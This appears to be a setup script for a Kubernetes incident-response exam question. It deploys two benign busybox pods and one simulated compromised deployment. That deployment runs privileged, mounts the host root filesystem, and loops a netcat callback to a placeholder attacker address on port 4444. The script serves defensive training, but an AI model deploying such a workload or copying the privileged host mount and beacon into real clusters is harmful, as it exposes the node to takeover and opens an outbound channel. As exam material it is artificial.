#!/bin/bash
set -euo pipefail

NS="incident-response"

kubectl create namespace "$NS" --dry-run=client -o yaml | kubectl apply -f -

mkdir -p /tmp/exam/q15
rm -f /tmp/exam/q15/incident.txt

# Reset candidate work
kubectl -n "$NS" delete networkpolicy quarantine --ignore-not-found=true >/dev/null 2>&1 || true

# Benign workloads
for APP in metrics-agent log-shipper; do
cat <<YAML | kubectl apply -f - >/dev/null
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ${APP}
  namespace: incident-response
  labels:
    app: ${APP}
spec:
  replicas: 1
  selector:
    matchLabels:
      app: ${APP}
  template:
    metadata:
      labels:
        app: ${APP}
    spec:
      containers:
      - name: main
        image: busybox:1.36
        command: ["/bin/sh","-c","sleep 86400"]
YAML
done

# Compromised workload: privileged, mounts the host filesystem, beacons out
cat <<YAML | kubectl apply -f - >/dev/null
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kernel-helper
  namespace: incident-response
  labels:
    app: kernel-helper
spec:
  replicas: 1
  selector:
    matchLabels:
      app: kernel-helper
  template:
    metadata:
      labels:
        app: kernel-helper
    spec:
      containers:
      - name: helper
        image: busybox:1.36
        command: ["/bin/sh","-c","while true; do nc -w 1 203.0.113.66 4444 2>/dev/null; sleep 20; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: hostroot
          mountPath: /host
      volumes:
      - name: hostroot
        hostPath:
          path: /
YAML

# Ensure the malicious deployment is scaled back up if a previous run scaled it down
kubectl -n "$NS" scale deployment kernel-helper --replicas=1 >/dev/null 2>&1 || true

echo "Question 15 setup complete"
